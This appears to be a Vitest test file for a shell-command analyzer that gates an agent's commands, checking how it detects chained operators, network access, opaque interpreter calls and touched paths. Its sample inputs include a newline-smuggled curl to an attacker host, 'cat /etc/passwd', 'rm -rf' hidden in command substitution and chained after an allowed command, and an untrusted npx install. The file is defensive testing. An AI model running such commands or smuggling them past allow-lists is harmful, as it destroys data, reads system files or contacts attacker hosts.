import { describe, expect, it } from "vitest";
import { analyzeShell } from "./shellAnalyzer";

const CWD = "/Users/agent/workspace";

describe("analyzeShell", () => {
  it("parses a single command with a relative path arg", () => {
    const plan = analyzeShell("cat src/main.ts", { cwd: CWD });
    expect(plan.commands.map((c) => c.name)).toEqual(["cat"]);
    expect(plan.touchedPaths).toContain(path("src/main.ts"));
    expect(plan.controlOperators).toEqual([]);
    expect(plan.networkAccess).toBe(false);
  });

  it.each(["cat ..", "ls ..", "cat '..'", 'cat ".."'])(
    "surfaces bare parent directory args as touched paths: %s",
    (command) => {
      const plan = analyzeShell(command, { cwd: CWD });

      expect(plan.touchedPaths).toContain(path(".."));
    },
  );

  it("detects control operators ; && || |", () => {
    const plan = analyzeShell("echo a && echo b ; echo c | grep d", { cwd: CWD });
    expect(plan.controlOperators.sort()).toEqual(["&&", ";", "|"]);
    expect(plan.commands.map((c) => c.name)).toEqual(["echo", "echo", "echo", "grep"]);
  });

  it("treats shell newlines as command separators", () => {
    const plan = analyzeShell("git status\ncurl https://attacker.example", { cwd: CWD });

    expect(plan.controlOperators).toContain("newline");
    expect(plan.commands.map((command) => command.name)).toEqual(["git", "curl"]);
    expect(plan.networkAccess).toBe(true);
  });

  it("flags network access for curl/git fetch/npm install", () => {
    expect(analyzeShell("curl https://example.com", { cwd: CWD }).networkAccess).toBe(true);
    expect(analyzeShell("git fetch origin", { cwd: CWD }).networkAccess).toBe(true);
    expect(analyzeShell("npm install", { cwd: CWD }).networkAccess).toBe(true);
    expect(analyzeShell("ls -la", { cwd: CWD }).networkAccess).toBe(false);
  });

  it.each([
    "python script.py",
    "node script.js",
    "bash script.sh",
    "sh -c 'cat /etc/passwd'",
    "npm run build",
    "npx -y untrusted-package",
    "pnpm exec tool",
    "yarn run build",
    "bun run build",
    "open -a Terminal",
  ])("marks unparsed interpreter execution opaque: %s", (command) => {
    expect(analyzeShell(command, { cwd: CWD }).opaqueExecution).toBe(true);
  });

  it("captures command substitution $() as an analyzed inner segment", () => {
    const plan = analyzeShell("echo $(rm -rf /tmp/cache)", { cwd: CWD });
    expect(plan.controlOperators).toContain("$(");
    expect(plan.commands.map((c) => c.name)).toContain("rm");
  });

  it("captures redirection targets as write/read paths", () => {
    const plan = analyzeShell("echo hello > out.txt && cat < in.txt >> log.txt", { cwd: CWD });
    expect(plan.commands[0].writesPaths).toContain(path("out.txt"));
    const cat = plan.commands.find((c) => c.name === "cat")!;
    expect(cat.readsPaths).toContain(path("in.txt"));
    expect(cat.writesPaths).toContain(path("log.txt"));
  });

  it("resolves ~ to $HOME", () => {
    const plan = analyzeShell("cat ~/.bashrc", { cwd: CWD });
    const home = process.env.HOME ?? "~";
    expect(plan.touchedPaths).toContain(`${home}/.bashrc`);
  });

  it("injection bypass: chained rm after an allowed command is surfaced", () => {
    // Legacy wildcard matchers might pass `git status` and miss the chained rm.
    const plan = analyzeShell("git status --short && rm -rf /tmp/cache", { cwd: CWD });
    expect(plan.commands.map((c) => c.name)).toEqual(["git", "rm"]);
    expect(plan.controlOperators).toContain("&&");
    expect(plan.networkAccess).toBe(false);
  });

  it("expands $VAR in path tokens (best-effort)", () => {
    process.env.ZEROX_TEST_VAR = "/opt/data";
    const plan = analyzeShell("cat $ZEROX_TEST_VAR/file.txt", { cwd: CWD });
    expect(plan.touchedPaths).toContain("/opt/data/file.txt");
    delete process.env.ZEROX_TEST_VAR;
  });

  it("raw is preserved", () => {
    const raw = "ls -la | head -n 5";
    expect(analyzeShell(raw, { cwd: CWD }).raw).toBe(raw);
  });

  it("touchedPaths is the union of per-command read/write paths", () => {
    const plan = analyzeShell("cp a.txt b.txt", { cwd: CWD });
    expect(plan.touchedPaths).toEqual(expect.arrayContaining([path("a.txt"), path("b.txt")]));
  });
});

function path(rel: string): string {
  // Resolve relative to CWD the same way the analyzer does.
  const { resolve } = require("node:path");
  return resolve(CWD, rel);
}
